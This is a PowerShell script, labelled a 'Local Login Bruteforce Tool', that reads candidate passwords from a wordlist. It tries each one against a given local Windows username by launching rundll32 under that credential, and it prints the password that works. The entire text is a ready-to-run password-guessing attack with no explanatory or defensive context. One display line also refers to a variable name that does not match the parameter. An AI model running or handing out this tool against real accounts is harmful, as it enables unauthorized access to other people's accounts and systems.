param (
[Parameter(Mandatory=$true)][string]$wordlistfile,
[Parameter(Mandatory=$true)][string]$username,
[Parameter(Mandatory=$false)][bool]$verb
)
Write-Host -Fore cyan @"
[_][_][_][_][_][_][_][_][_]
[_] Local		[_]
[_]    Login		[_]
[_] 	   Bruteforce	[_]
[_]	          Tool 	[_]
[_][_][_][_][_][_][_][_][_]
||			 ||
||=======================||
"@
Write-Host -Fore yellow "Username : $username"
Write-Host -Fore yellow "Wordlist : $wordlistfile"
Write-Host -Fore yellow "Verbose : $verbose"
foreach ($password in [System.IO.File]::ReadLines($wordlistfile)) {

$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
try {
Start-Process rundll32 -WorkingDirectory "C:\Windows\System32" -Credential $credential
Write-Host -Fore green "`n$username : $password"
exit
}
catch {
if($verb) {
Write-Host -Fore red "`r$username : $password" -NoNewLine
}
}
}
